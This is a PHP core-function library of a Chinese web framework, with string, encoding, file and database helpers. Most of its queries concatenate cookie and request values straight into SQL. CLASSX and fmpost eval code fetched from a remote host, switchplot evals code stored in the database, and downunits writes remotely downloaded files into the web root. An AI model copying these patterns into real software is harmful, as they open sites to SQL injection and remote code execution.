<?php
/*→脚本描述(DESCRIB)
 脚本名称:酷德方舟数据操控核心函数(PHP)@酷德信息系统模型
 基本功能:数据库操作、文件操作以及数据格式编转码（数据、文件、形态转化与时空关系变动操作）
 作者:海棠山铁哥
 QQ/VX:58201123
 创作历时:2017.9-2020.5
 创作历程:抚州、海口、成都 
 当前版本:cCore20200501
END OF DESCRIB ←*/
//CORE CODE START
function _get($str){ $val = !empty($_GET[$str]) ? $_GET[$str] : ""; return $val; } //DESCRIB ():  END@()
function _post($str){ $val = !empty($_POST[$str]) ? $_POST[$str] : ""; return $val; } //DESCRIB ():  END@()
function _server($str){$val = !empty($_SERVER[$str]) ? $_SERVER[$str] : ""; return $val; }//DESCRIB ():  END@()
function _cookie($str){$val = !empty($_COOKIE[$str]) ? $_COOKIE[$str] : ""; return $val; }//DESCRIB ():  END@()
function _session($str){$val = !empty($_SESSION[$str]) ? $_SESSION[$str] : "";   return $val; }//DESCRIB ():  END@()
function beforestr($fstring,$fg){$tmpstst=explode($fg,$fstring);$tottmp=count($tmpstst);$fmxxx="";for ($ix=0;$ix<$tottmp-2;$ix++){$fmxxx=$fmxxx.$tmpstst[$ix].$fg;};$fmxxx=$fmxxx.$tmpstst[$tottmp-1];return $fmxxx;}
function base64EncodeImage($image_file) {$base64_image = '';$image_info = getimagesize($image_file);$image_data = fread(fopen($image_file, 'r'), filesize($image_file));$base64_image = 'data:' . $image_info['mime'] . ';base64,' . chunk_split(base64_encode($image_data));return $base64_image;}
function b64tofile($base64_image_content,$path,$fname){if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $base64_image_content, $result)){$type = $result[2];if ($fname==""){$new_file = combineurl($path,"/".date('Ymd',time())."/");}else{$new_file = combineurl($path,"/");};if(!file_exists($new_file)){ mkdir($new_file, 0700);}if ($fname==""){$new_file = $new_file.time().".{$type}";}else{$new_file = $new_file.$fname.".{$type}";};if (file_put_contents($new_file, base64_decode(str_replace($result[1], '', $base64_image_content)))){return $new_file;}else{return false;}}else{return false;}}    //匹配出图片的格式
function cdfile($rurl,$lcfile){$ch=curl_init($rurl);$downloadPath=$lcfile;$downloadPathName=$downloadPath;$lcpath=urltopath($lcfile);is_dir($lcpath) OR mkdir($lcpath, 0777, true); $fp=fopen($downloadPathName,'wb') or die('open failed!');curl_setopt($ch,CURLOPT_FILE,$fp);curl_setopt($ch,CURLOPT_HEADER,0);$res=curl_exec($ch);curl_close($ch);fclose($fp); }//新建或打开文件,将curl下载的文件写入文件
function checkBOM($strtxt) { $charset[1] = substr($strtxt, 0, 1); $charset[2] = substr($strtxt, 1, 1); $charset[3] = substr($strtxt, 2, 1); if (ord($charset[1]) == 239 && ord($charset[2]) == 187 && ord($charset[3]) == 191) { return substr($strtxt, 3); } else { return $strtxt; };} 
function check_gifcartoon($image_file){ $fp = fopen($image_file,'rb');$image_head = fread($fp,1024);fclose($fp);return preg_match("/".chr(0x21).chr(0xff).chr(0x0b).'NETSCAPE2.0'."/",$image_head)?false:true;}
function conturn($mstr){$mstr=str_replace("{","[",$mstr);$mstr=str_replace("}","]",$mstr);return $mstr;}
function combineurl($qu,$hu){if (substr($qu,-1)=="/"){$qu=killlaststr($qu);}if (substr($hu,0,1)=="/"){return $qu.$hu;}else{return $qu."/".$hu;}}//DESCRIB ():  END@()
function comburl($qurl,$hurl){if (substr($hurl,0,1)=="/"){return $qurl.substr($hurl,1,strlen($hurl)-1);}else{return $qurl.$hurl;}}//DESCRIB comburl(): 合并两个地址 ENDcomburl@()
function connurl($bpath,$curl){if (strpos("xxx".$curl,"../")>0){$ptcu=explode("../",$curl);$totmin=count($ptcu);}else{$totmin=0;}if (substr($bpath,-1)!="/"){$bpath=$bpath."/";}$ptba=explode("/",$bpath);$totptb=count($ptba);$fmurl="";if ($totmin>0){for ($i=0;$i<($totptb-$totmin);$i++){$fmurl=$fmurl.$ptba[$i]."/";}}else{$fmurl=$bpath;};$curl=str_replace("../","",$curl);return $fmurl.$curl;}//DESCRIB connurl(): 相对地址合并 END@connurl()
function countkey($fullresult){$keyname=qian($fullresult,"#/#");$partkn=explode("#-#",$keyname);$countkn=count($partkn);return $countkn;}//DESCRIB ():  END@()
function countresult($fullresult){$partkn=explode("#/#",$fullresult);$countkn=count($partkn);return $countkn-2;}//DESCRIB ():  END@()
function CLASSX($clsid){if (strpos("xxx"._post("clsadd"),$clsid."/")>0){$clsxyz="";$clsrst="";}else{$clsrst=SX("select funfull,oldfull from coode_phpcls where funname='".$clsid."' or  funname='".$clsid."()'");$totcls=countresult($clsrst);if (intval($totcls)>0 and anyvalue($clsrst,"funfull",0)!=""){$clsxyz=anyvalue($clsrst,"funfull",0); $oldxyz=anyvalue($clsrst,"oldfull",0); }else{$clsxyz=file_get_contents("http://".glm()."/DNA/EXF/anyfuns.php?fid=getmothercls&regcode=".glr()."&clsid=".str_replace("()","",$clsid));$oldxyz=$clsxyz;if (intval($totcls)==0){$x=UX("insert into coode_phpcls(funname,CRTM,UPTM,OLMK,lang,funfull,oldfull,lastfull,CRTOR)values('".str_replace("()","",$clsid)."()',now(),now(),'".onlymark()."','php','".$clsxyz."','".$oldxyz."','".$oldxyz."','coode')");}else{$x=UX("update coode_phpcls set funfull='".$clsxyz."',oldfull='".$clsxyz."',lastfull='".$clsxyz."' where funname='".$clsid."' or  funname='".$clsid."()'");};};if ($oldxyz==$clsxyz){ $clsrst=tostring($clsxyz);}else{$clsrst=tostring($oldxyz);};};if (_post("clsadd")==""){$_POST["clsadd"]=$clsid."/";}else{$_POST["clsadd"]=$_POST["clsadd"].$clsid."/";}return $clsrst;}//DESCRIB ():也可以远程获取 如果已存在了运行了一次就不在运行 class  END@()
function CLASSY($clsid){if (strpos("xxx"._post("clsadd"),$clsid."/")>0){$clsxyz=""; $clsrst="";}else{$clsxyz=UX("select funfull as result from coode_phpcls where funname='".$clsid."' or funname='".$clsid."()'");     $clsrst=tostring($clsxyz);};if (_post("clsadd")==""){$_POST["clsadd"]=$clsid."/";}else{$_POST["clsadd"]=$_POST["clsadd"].$clsid."/";}  return $clsrst;}//DESCRIB ():也可以远程获取class如果已存在了运行了一次就不在运行  END@()
function dfp(){return "/ORG/BRAIN/images/icon/system/%E9%85%B7%E5%BE%B7.svg";}// 缺省图片显示
function extname($srcstr){if (strpos($srcstr,".")>0){$ptsrc=explode(".",$srcstr);$totpt=count($ptsrc);return $ptsrc[$totpt-1];}else{return "";}}//DESCRIB extname(): 地址取扩展名 END@extname()
function enstrrn($gfstring){ $ftxt=str_replace("\r\n","-r-n",$gfstring);return $ftxt;}//第三维,在PHP里换行状态的要变成JSHTML的换行状态
function exchangercv($tbnm,$pagekey,$datakey,$methd,$snx){$ptpk=explode(",",$pagekey);$ptdk=explode(",",$datakey);$totp=count($ptpk);if ($methd=="post"){for ($i=0;$i<$totp;$i++){$_POST["p_".$ptdk[$i].$snx]=_post($ptpk[$i]);}}else{for ($i=0;$i<$totp;$i++){$_POST["p_".$ptdk[$i].$snx]=_get($ptpk[$i]);}}$dz=anyrcv($tbnm,$datakey,$snx,"");return $dz;}//DESCRIB ():  END@()
function fmpost($garr=array(array()),$gsno,$gtnm,$gkies){  eval(CLASSX("formpost"));$fmp=new formpost();return $fmp->fmpost($garr=array(array()),$gsno,$gtnm,$gkies);}//DESCRIB ():  END@()
function gl(){return "localhost";}//DESCRIB glb():本系统mysql 数据库IP END@glb()
function glu(){return "userid";}//DESCRIB glu():本系统mysql 数据库用户名 END@glu()
function glp(){return "password";}//DESCRIB glp():本系统mysql 数据库密码 END@glp()
function glb(){return "blueprints";}//DESCRIB glb():本系统mysql 数据库 END@lgb()
function gln(){return "coode";}//DESCRIB gln():当前使用系统名称 END@gln()
function glt(){return "blueprints@localhost";}//DESCRIB glt():当前实例名称 END@glt()
function glm(){return "[motherhost]";}//DESCRIB glm():母系统域名 END@glt()
function glr(){return "[regcode]";}//DESCRIB glr():授权注册码 END@glt()
function glw(){return $_SERVER["HTTP_HOST"]."/";}//DESCRIB glw():本服务器域名  结尾要加/ 如果没有域名请用本机分配的固定IP,结尾也要加/ END@glw()
function get_between($input, $start, $end){$substr = substr($input, strlen($start)+strpos($input, $start),(strlen($input) - strpos($input, $end))*(-1));return $substr;}//DESCRIB get_between(): 取字符串中间 END@get_between()
function getRandChar($length){$str = null;$strPol = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz";$max = strlen($strPol)-1;for($i=0;$i<$length;$i++){$str.=$strPol[rand(0,$max)]; }return $str;}
function grpcid(){$grpx=atv("(coode_sysdefault@companyid='".$_COOKIE["cid"]."').groupid");return $grpx;}//DESCRIB ():  END@()
function hexhh2hstr($hhstr){return String2Hex(str_replace("\r\n","-r-n",str_replace("'","\'",$hhstr)));}
function hh2hstr($hhstr){return str_replace("\r\n","-r-n",str_replace("'","\'",$hhstr));}
function hexany2str($hexstr){if (strpos($hexstr,"TYPE_HEX:")>0){$hexstr=Hex2String(hou($hexstr,"TYPE_HEX:"));};return str_replace("-r-n","\r\n",str_replace("\\"."'","'",$hexstr));}
function huanhang(){return "\r\n";}
function hou($fullstr,$astr){if ($fullstr!="" and $astr!=""){$cunzaibu=strpos("x".$fullstr,$astr);if ($cunzaibu>0 ){$spos=strpos($fullstr,$astr);$lens=strlen($astr);$alll=strlen($fullstr);return substr($fullstr,($spos+$lens),($alll-($spos+$lens)));}else{return $fullstr;};}else{return "";}}//DESCRIB (): 完美兼容中文混合取字符串后面 END@()
function Hex2String($hex){$string='';for ($i=0; $i < strlen($hex)-1; $i+=2){$string .= chr(hexdec($hex[$i].$hex[$i+1]));}return $string;}
function isen($str){ if(preg_match("/^[a-zA-Z\s]+$/",$str)){return true;}else{return false;}}
function ischi($str){if (preg_match('/^[\x{4e00}-\x{9fa5}]+$/u', $str) > 0) {return 1;} else if (preg_match('/[\x{4e00}-\x{9fa5}]/u', $str) > 0) {return 0.5;}else{return 0;}}
function isx1($brst,$frst){if (strpos("xx-".$brst,$frst)>0){return true;}else{return false;}}//DESCRIB ():  END@()
function iso1($brst,$frst,$isxy){if ($isxy==true){if (strpos("xx-".$brst,$frst)>0){return true;}else{return false;}}else{return false;}}//DESCRIB ():  END@()
function isx2($brst,$frst,$trst){if (strpos("xx-".$brst,$frst)>0 and strpos("xx-".$brst,$trst)>0){return true;}else{return false;}}//DESCRIB ():  END@()
function iso2($brst,$frst,$trst){if (strpos("xx-".$brst,$frst)>0 or strpos("xx-".$brst,$trst)>0){return true;}else{return false;}}//DESCRIB ():  END@()
function isx3($brst,$frst,$trst,$thrst){if (strpos("xx-".$brst,$frst)>0 and strpos("xx-".$brst,$trst)>0 and strpos("xx-".$brst,$thrst)>0){return true;}else{return false;}}//DESCRIB ():  END@()
function iso3($brst,$frst,$trst,$thrst){if (strpos("xx-".$brst,$frst)>0 or strpos("xx-".$brst,$trst)>0 or strpos("xx-".$brst,$thrst)>0){return true;}else{return false;}}//DESCRIB ():  END@()
function killlaststr($strx){ return substr($strx,0,strlen($strx)-1);}
function killfirststr($strx){return substr($strx,1,strlen($strx)-1);}
function killlastsplit($strx,$splt){$ptstrx=explode($splt,$strx);$totp=count($ptstrx);$fmxxx="";for ($i=0;$i<$totp-1;$i++){$fmxxx=$fmxxx.$ptstrx[$i].$splt;}return $fmxxx;}
function localroot(){if (substr(str_replace("\\","/",$_SERVER["DOCUMENT_ROOT"]),-1)!="/"){$gml=str_replace("\\","/",$_SERVER["DOCUMENT_ROOT"])."/";}else{$gml=str_replace("\\","/",$_SERVER["DOCUMENT_ROOT"]);};if (strpos($gml,":")>0){$qdq=qian($gml,":");$gml=strtoupper($qdq).":".hou($gml,":");};return $gml;}//DESCRIB localroot(): 获取本地根目录 END@localroot()
function labturn($mstr){if ( strpos("xx".$mstr,"<")>0 and strpos("xx".$mstr,">")>0){$mstr=str_replace("{","｛",$mstr);$mstr=str_replace("}","｝",$mstr);$mstr=str_replace("<","{",$mstr);$mstr=str_replace(">","}",$mstr);}return $mstr;}//把真实代码模板化存储  
function labturns($mstr){ $mstr=str_replace("{","｛",$mstr);$mstr=str_replace("}","｝",$mstr);$mstr=str_replace("<","{",$mstr);$mstr=str_replace(">","}",$mstr);$mstr=str_replace("\"","@",$mstr);$mstr=str_replace("'","#",$mstr);$mstr=str_replace("OC","onclick",$mstr);$mstr=str_replace("OC","ONCLICK",$mstr);return $mstr;}
function lastsplit($strx,$splt){$ptstrx=explode($splt,$strx);$totp=count($ptstrx);  return $ptstrx[$totp-1];}
function laststr($fstring,$fg){$tmpstst=explode($fg,$fstring);$tottmp=count($tmpstst);return $tmpstst[$tottmp-1];}//DESCRIB (): 判断是否是质数 END@()
function mrmn(){return "-r-n";}
function mysql_connect($fi,$fu,$fp){return new mysqli($fi,$fu,$fp);}//DESCRIB mysql_connect(): 连接数据库方法，如果是php5.5- 去掉此函数并修改select相关方法 END@mysql_connect()
function myfirstpos(){$conn=mysql_connect(gl(),glu(),glp());$fps=updatings($conn,glb(),"select rid as result from coode_role where cid='".$_COOKIE["cid"]."' and CRTOR='".$_COOKIE["uid"]."' and rid like '%@%' order by depart","utf8");return $fps;}//DESCRIB ():  END@()
function pmenum($numx){$ljx=0;for ($px=1;$px<($numx+1);$px++){if (($numx/$px)==ceil($numx/$px)){$ljx=$ljx+1;}}if ($ljx==2){return true;}else{return false;}}//DESCRIB (): 判断是否是质数 END@()
function qian($fullstr,$astr){if ($fullstr!="" and $astr!=""){$cunzaibu=strpos("x".$fullstr,$astr);if ($cunzaibu>0 ){$astrlen=strpos($fullstr,$astr);$fmrt=substr($fullstr,0,$astrlen);return $fmrt;}else{return $fullstr;}}else{return "";}}//DESCRIB qian(): 完美兼容中文混合 END@qian()
function SX($asqlstr){$conn=mysql_connect(gl(),glu(),glp());return selecteds($conn,glb(),$asqlstr,"utf8","");}//DESCRIB ():  END@()
function String2Hex($string){if (substr($string,0,10)=="dTYPE_HEX:"){return $string;}else{$hex='';for ($i=0; $i < strlen($string); $i++){$hex .= dechex(ord($string[$i]));}return $hex;}}
function tabstr(){return "	";}
function turncon($mstr){$mstr=str_replace("[","{",$mstr);$mstr=str_replace("]","}",$mstr);return $mstr;}//把[]标签替换成{} 防止静态模板自己被解析，使用的时候实例化与静态有区别，不然编辑静态的时候容易出错
function turnlab($mstr){if (strpos("xx".$mstr,"{")>0 and strpos("xx".$mstr,"}")>0 ){$mstr=str_replace("{","<",$mstr);$mstr=str_replace("}",">",$mstr);$mstr=str_replace("｛","{",$mstr);$mstr=str_replace("｝","}",$mstr);}return $mstr;}//把模板实例化使用
function toerror($etype,$emsg,$efile,$eline){ $sqla="runfile,errtime,errtype,errmsg,errfile,errline,CRTOR,CRTM,UPTM,OLMK,RIP,refer";$sqlb="'".$_SERVER['PHP_SELF']."',now(),'".$etype."','dTYPE_HEX:".String2Hex($emsg)."','".$efile."','".$eline."','".$_COOKIE["uid"]."',now(),now(),'".onlymark()."','".getip()."','".$_SERVER['HTTP_REFERER']."'";$xz=UX("insert into coode_catcherror(".$sqla.")values(".$sqlb.")");return true;}//DESCRIB ():  END@()
function trimall($str){$qians=array(" ","　","\t","\n","\r");$hous=array("","","","","");return str_replace($qians,$hous,$str);    }//DESCRIB ():删除空格  END@()
function urltopath($url){$ptxyz=explode("/",$url);$totp=count($ptxyz);$lslen=strlen($ptxyz[$totp-1]);return substr($url,0,strlen($url)-$lslen);}//DESCRIB ():  END@()
function urlfname($urlx){$ptxyz=explode("/",$urlx);$totp=count($ptxyz);return $ptxyz[$totp-1];}//DESCRIB ():  END@()
function unicode_encode($name){$name = iconv('UTF-8', 'UCS-2', $name);$len = strlen($name);$str = '';  for($i=0;$i<$len-1;$i=$i+2){  $c = $name[$i];$c2 = $name[$i + 1];if (ord($c) > 0){ $str .= '\u'.base_convert(ord($c), 10, 16).base_convert(ord($c2), 10, 16);}else{$str .= $c2;}}return $str;}// 两个字节的文字
function unicode_decode($name){$pattern = '/([\w]+)|(\\\u([\w]{4}))/i';preg_match_all($pattern, $name, $matches);if (!empty($matches)){$name = '';for ($j = 0; $j < count($matches[0]); $j++){$str = $matches[0][$j];if (strpos($str, '\\u') === 0){$code = base_convert(substr($str, 2, 2), 16, 10);$code2 = base_convert(substr($str, 4), 16, 10);$c = chr($code).chr($code2);$c = iconv('UCS-2', 'UTF-8', $c);$name .= $c;}else{$name .= $str;}}}return $name;} // 转换编码，将Unicode编码转换成可以浏览的utf-8编码
function UnicodeEncode($str){preg_match_all('/./u',$str,$matches); $unicodeStr = "";foreach($matches[0] as $m){$unicodeStr .= "&#".base_convert(bin2hex(iconv('UTF-8',"UCS-4",$m)),16,10);}return $unicodeStr;}
function unicodeDecode($unicode_str){$json = '{"str":"'.$unicode_str.'"}';$arr = json_decode($json,true);if(empty($arr)) return '';return $arr['str'];}
function UX($asqlstr){$conn=mysql_connect(gl(),glu(),glp());return updatings($conn,glb(),$asqlstr,"utf8");}//DESCRIB ():  END@()
function zyferror($type, $message, $file, $line){$rtnstr="zyferror ".date("Ymdhis")."-<b>set_error_handler: " . $type . ":" . $message . " in " . $file . " on " . $line . " line --".$_SERVER['PHP_SELF'].".</b><br />";$z=toerror($type,$message,$file,$line);return $z;}//DESCRIB ():  END@()
function zyfshutdownfunc(){if ($error = error_get_last()) {$rtnstr="zyfshutdown ...<b>register_shutdown_function: Type:" . $error["type"] . " Msg: " . $error["message"] . " in " . $error["file"] . " on line " . $error["line"] ."--".$_SERVER['PHP_SELF'];$z=toerror($error["type"],$error["message"],$error["file"],$error["line"]);return $z;}}//DESCRIB ():  END@()
function jstohex($vlsx){
  if (strpos($vsx,"TYPE_HEX:")>0){
    return $vlsx;
  }else{
   if (strlen($vlsx)>200 or strpos($vlsx,"\r\n")>0 or strpos($vlsx,"'")>0 or strpos($vlsx,"<")>0 or strpos($vlsx,">") or strpos($vlsx,"\"">0)){
    $vlsx=str_replace("\\","-/-/",$vlsx);
    return "dTYPE_HEX:".String2Hex(str_replace("\r\n","-r-n",str_replace("'","\'",$vlsx)));
   }else{
    $vlsx=str_replace("\\","-/-/",$vlsx);
    return str_replace("\r\n","-r-n",str_replace("'","\'",$vlsx));
   };
  }
}
  function s17url($urlx){
    $pturl=explode("/",$urlx);
    $cpt=count($pturl);
    $partx=$pturl[6];
    $frontpath=qian($urlx,"/".$partx);
    $backpath=hou($urlx,"/".$partx."/");
    return $frontpath."/".urlencode($partx)."/".$backpath;
  }
function enstrs($gfstring){
  $ftxt=str_replace('<','&lt;',$gfstring);
  $ftxt=str_replace('>','&gt;',$ftxt);
  $ftxt=str_replace('".\'\r\n\'."','@r@n',$ftxt);//第三维,JS里的换行;写出的代码里又生成的JS代码
  $ftxt=str_replace('\r\n','/-r/-n',$ftxt);//第二维,PHP里写出的代码;
  return $ftxt;
 }

function tohex($vlsx){
  if (strpos($vsx,"TYPE_HEX:")>0){
    return $vlsx;
  }else{
   if (strlen($vlsx)>200 or strpos($vlsx,"\r\n")>0 or strpos($vlsx,",")>0  ){
    $vlsx=str_replace("\\","-/-/",$vlsx);
    return "dTYPE_HEX:".String2Hex(str_replace("\r\n","-r-n",str_replace("'","\\'",$vlsx)));
   }else{
    $vlsx=str_replace("\\","-/-/",$vlsx);
    return str_replace("\r\n","-r-n",str_replace("'","\\'",$vlsx));
   };
  }
}
function gohex($vlsx){
  if (strpos($vsx,"TYPE_HEX:")>0){
    return $vlsx;
  }else{
    $vlsx=str_replace("\\","-/-/",$vlsx);
    return "dTYPE_HEX:".String2Hex(str_replace("\r\n","-r-n",str_replace("'","\'",$vlsx)));
  }
}
function tostring($vlsx){
  if (strpos("x".$vlsx,"TYPE_HEX:")>0){
    $houvlx=Hex2String(hou($vlsx,"TYPE_HEX:"));
    $houvlx=str_replace("-r-n","\r\n",str_replace("\\"."'","'",$houvlx));
    return str_replace("-/-/","\\",$houvlx);
  }else{
   $vlsx=str_replace("-r-n","\r\n",str_replace("\\"."'","'",$vlsx));
    return str_replace("-/-/","\\",$vlsx);
  };
}
function haspmtoffun($fid,$uid,$cid){
    $bwl=SX("select whitelist,blacklist from coode_funbwclist where funid='".$fid."' and comid='".$cid."'");
    $tot=countresult($bwl);
    if ($tot>0){
        $wlist=anyvalue($bwl,"whitelist",0);
        $blist=anyvalue($bwl,"blacklist",0);
        if (strpos(".".$blist,$uid)>0){
            return false;
        }
        if (strpos(".".$wlist,$uid)>0){
            return true;
        }
    }
      $frst=SX("select STATUS,valx from coode_fpmtru where funid='".$fid."' and comid='".$cid."' and clientid='".$uid."'");
      $totx=countresult($frst);
      if ($totx==0){
        return true;    
      }else{
        if (intval(anyvalue($frst,"STATUS",0))*intval(anyvalue($frst,"valx",0))==1){
            return true;
        }else{
            return false;
        }
      }
}
function haspmtofpage($pgid,$uid,$cid){
    $bwl=SX("select whitelist,blacklist from coode_pagebwclist where pagemark='".$pgid."' and comid='".$cid."'");
    $tot=countresult($bwl);
    if ($tot>0){
        $wlist=anyvalue($bwl,"whitelist",0);
        $blist=anyvalue($bwl,"blacklist",0);
        if (strpos(".".$blist,$uid)>0){
            return false;
        }
        if (strpos(".".$wlist,$uid)>0){
            return true;
        }
    }
      $prst=SX("select STATUS,valx from coode_ppmtru where pagemark='".$pgid."' and comid='".$cid."' and clientid='".$uid."'");
      $totx=countresult($prst);
      if ($totx==0){
        return true;    
      }else{
        if (intval(anyvalue($prst,"STATUS",0))*intval(anyvalue($prst,"valx",0))==1){
            return true;
        }else{
            return false;
        }
      }
}
function haspmtoftab($tbid,$uid,$cid){
    $bwl=SX("select whitelist,blacklist from coode_tabbwclist where tabname='".$tbid."' and comid='".$cid."'");
    $tot=countresult($bwl);
    if ($tot>0){
        $wlist=anyvalue($bwl,"whitelist",0);
        $blist=anyvalue($bwl,"blacklist",0);
        if (strpos(".".$blist,$uid)>0){
            return "-1";
        }
        if (strpos(".".$wlist,$uid)>0){
            return "1";
        }
    }
    return "0";
}
function switchplot($markid){
    $srst=SX("select evalcode,switchtitle,STATUS from coode_switchlist where switchid='".$markid."'");
    $totrst=countresult($srst);
    if (intval($totrst)>0){
      $ecode=anyvalue($srst,"evalcode",0);    
      $stitle=anyvalue($srst,"switchtitle",0);    
      $stt=anyvalue($srst,"STATUS",0); 
      $rtnstt=$stt;
      $_GET["rtnstt"]=$stt;
      if ($ecode!=""){
          $_GET["switchstatus"]=$stt;
          $switchstatus=$stt;
          eval($ecode);
      };
      if (intval($rtnstt)>=1){
        return true; 
      }else{
        return false;  
      }
    }else{
      return true;   
    }
}
function systoscvofcom($comid){
    $sqla="compid,sysid,sysname,inurl,outurl,indexurl,syscls,units,faceimg,lastupdt,plotid,idxplid,apps";
    $sysrst=SX("select sysid,sysname,inurl,outurl,indexurl,syscls,units,faceimg,lastupdt,plotid,idxplid,apps from coode_sysinformation");
    $totsys=countresult($sysrst);
    for ($i=0;$i<$totsys;$i++){
      $sysid=anyvalue($sysrst,"sysid",$i);
      $sysname=anyvalue($sysrst,"sysname",$i);
      $inurl=anyvalue($sysrst,"inurl",$i);
      $outurl=anyvalue($sysrst,"outurl",$i);
      $indexurl=anyvalue($sysrst,"indexurl",$i);
      $syscls=anyvalue($sysrst,"syscls",$i);
      $units=anyvalue($sysrst,"units",$i);
      $faceimg=anyvalue($sysrst,"faceimg",$i);
      $lastupdt=anyvalue($sysrst,"lastupdt",$i);
      $plotid=anyvalue($sysrst,"plotid",$i);
      $idxplid=anyvalue($sysrst,"idxplid",$i);
      $apps=anyvalue($sysrst,"apps",$i);
      $newindexurl=$indexurl;
      $newinurl=$inurl;
      //qian($inurl,";")."?isworker=1&sysid=".$sysid."&comn=".$comid.";".qian($inurl,";")."?isvip=1&sysid=".$sysid."&comn=".$comid;
      $newouturl=qian($outurl,";")."?isworker=1&sysid=".$sysid."&comn=".$comid.";".qian($outurl,";")."?isvip=1&sysid=".$sysid."&comn=".$comid;
      $sqlb="'".$comid."','".$sysid."','".$sysname."','".$newinurl."','".$newouturl."','".$newindexurl."','".$syscls."','".$units."','".$faceimg."','".$lastupdt."','".$plotid."','".$idxplid."','".$apps."'";
      $z=UX("insert into coode_scvlist(".$sqla.")values(".$sqlb.")");
    }
    return true;
    
}
function appstate($cid,$appid){
    $stt=UX("select STATUS as result from coode_appstatelist where appid='".$appid."' and comid='".$cid."'");
    return intval($stt);
}
function anyvalue($fullresult,$keynm,$sqc)
{
  $keyname=qian($fullresult,"#/#");
  $partkn=explode("#-#",$keyname);
  $partresult=explode("#/#",$fullresult);
  $countprs=count($partresult);
  $countkn=count($partkn);
  $tempkey=0;
  for ($x=0;$x<=$countkn-1;$x++)
   {
    if ($partkn[$x]==$keynm)
    {
     $tempkey=$x;
     };
   };
  $sqcresult=$partresult[$sqc+1];
  $partpart=explode("#-#",$sqcresult);
  return $partpart[$tempkey];
}//DESCRIB ():  END@()

function strLength($str, $charset = 'utf-8') {
  if ($charset == 'utf-8')
    $str = iconv ( 'utf-8', 'gb2312', $str );
  $num = strlen ( $str );
  $cnNum = 0;
  for($i = 0; $i < $num; $i ++) {
    if (ord ( substr ( $str, $i + 1, 1 ) ) > 127) {
      $cnNum ++;
      $i ++;
    }
  }
  $enNum = $num - ($cnNum * 2);
  $number = ($enNum / 2) + $cnNum;
  return ceil ( $number );
}//DESCRIB ():  END@()
function cut_str($sourcestr, $cutlength) {
  $returnstr = '';
  $i = 0;
  $n = 0;
  $str_length = strlen ( $sourcestr ); //字符串的字节数 
  while ( ($n < $cutlength) and ($i <= $str_length) ) {
    $temp_str = substr ( $sourcestr, $i, 1 );
    $ascnum = Ord ( $temp_str ); //得到字符串中第$i位字符的ascii码 
    if ($ascnum >= 224) //如果ASCII位高与224，
    {
      $returnstr = $returnstr . substr ( $sourcestr, $i, 3 ); //根据UTF-8编码规范，将3个连续的字符计为单个字符   
      $i = $i + 3; //实际Byte计为3
      $n ++; //字串长度计1
    } elseif ($ascnum >= 192) //如果ASCII位高与192，
    {
      $returnstr = $returnstr . substr ( $sourcestr, $i, 2 ); //根据UTF-8编码规范，将2个连续的字符计为单个字符 
      $i = $i + 2; //实际Byte计为2
      $n ++; //字串长度计1
    } elseif ($ascnum >= 65 && $ascnum <= 90) //如果是大写字母，
    {
      $returnstr = $returnstr . substr ( $sourcestr, $i, 1 );
      $i = $i + 1; //实际的Byte数仍计1个
      $n ++; //但考虑整体美观，大写字母计成一个高位字符
    } else //其他情况下，包括小写字母和半角标点符号，
    {
      $returnstr = $returnstr . substr ( $sourcestr, $i, 1 );
      $i = $i + 1; //实际的Byte数计1个
      $n = $n + 0.5; //小写字母和半角标点等与半个高位字符宽...
    }
  }
  if ($str_length > $cutlength) {
    $returnstr = $returnstr ; //超过
  }
  return $returnstr;
}//DESCRIB ():  END@()

function unstrs($gfstring){
  if ($gfstring!=""){
    $gftxt=str_replace('«','<'.'?'.'p'.'hp',$gfstring);
    $gftxt=str_replace('»','?'.'>',$gftxt);
    $gftxt=str_replace("^","'",$gftxt);
    $gftxt=str_replace("卍卍","\r\n",$gftxt);
    $gftxt=str_replace("卍","\r\n",$gftxt);
    $gftxt=str_replace("\'","'",$gftxt);
    $gftxt=str_replace("\\\"","\"",$gftxt);
    $gftxt=str_replace('\\','',$gftxt);
    $gftxt=str_replace("δ","&",$gftxt);
    $gftxt=str_replace("&amp;","&",$gftxt);
    $gftxt=str_replace("＝","=",$gftxt);
    $gftxt=str_replace('？','?',$gftxt);
    $gftxt=str_replace("＋","+",$gftxt);
    $gftxt=str_replace('/|','\\',$gftxt);
    $gftxt=str_replace("/r/n","\r\n",$gftxt);
    $gftxt=str_replace("|~","\"",$gftxt); //要转义的 ""
    $gftxt=str_replace('/~','\"',$gftxt); //不转
    $gftxt=str_replace('@r@n','".\'\r\n\'."',$gftxt);
    $gftxt=str_replace('/-r/-n','\r\n',$gftxt);
    $gftxt=str_replace("|'","\\"."'",$gftxt);
    $gftxt=str_replace("`","\\'",$gftxt);
    $gftxt=str_replace("↘","\\",$gftxt);
    return $gftxt;
   }else{
    return "";
   }
  }
function hostaddr($hid){
    $hrst=SX("select host,port from coode_svshost where hostid='".$hid."'");
    $toth=countresult($hrst);
    if ($toth>0){
        if (anyvalue($hrst,"port",0)==""){
            return anyvalue($hrst,"host",0);
        }else{
            return anyvalue($hrst,"host",0).":".anyvalue($hrst,"port",0);
        }
    }else{
        return file_get_contents("http://coode.com.cn/DNA/EXF/anyfuns.php?fid=gethostaddr&hid=".$hid);
    }
}

function downunits($units,$host){
  $ptunits=explode(",",$units);
  $totpt=count($ptunits);
  $alls=0;
  $suss=0;
  for ($i=0;$i<$totpt;$i++){
    if ($ptunits[$i]!=""){
      $tmppt=$ptunits[$i];
      if (strpos($tmppt,".")>0){
        $ptpt=explode(".",$tmppt);
        $totptpt=count($ptpt);
        $kzm=$ptpt[$totptpt-1];
        $ppath=urltopath($tmppt);
        $usrc="http://".$host.$tmppt;
        $mysrc=combineurl(localroot(),$tmppt);
      }else{
        $mysrc="";
        $usrc="";
        $kzm="";
        $ppath=$tmppt;
      }
      is_dir($ppath) OR mkdir($ppath, 0777, true); 
      if (file_exists($mysrc) and _get("drop")==""){
      }else{
      switch($kzm){
        case "css":
          $z=overfile($mysrc,file_get_contents($usrc));
        break;
        case "js":
          $z=overfile($mysrc,file_get_contents($usrc));
        break;
        case "json":
          $z=overfile($mysrc,file_get_contents($usrc));
        break;
        case "html":
          $z=overfile($mysrc,file_get_contents($usrc));
        break;
        case "htm":
          $z=overfile($mysrc,file_get_contents($usrc));
        break;
        case "gif":
          GrabImage($usrc, $mysrc);
        break;
        case "jpg":
          GrabImage($usrc, $mysrc);
        break;
        case "png":
          GrabImage($usrc, $mysrc);
        break;
        case "svg":
          $z=overfile($mysrc,file_get_contents($usrc));
        break;
        case "php":
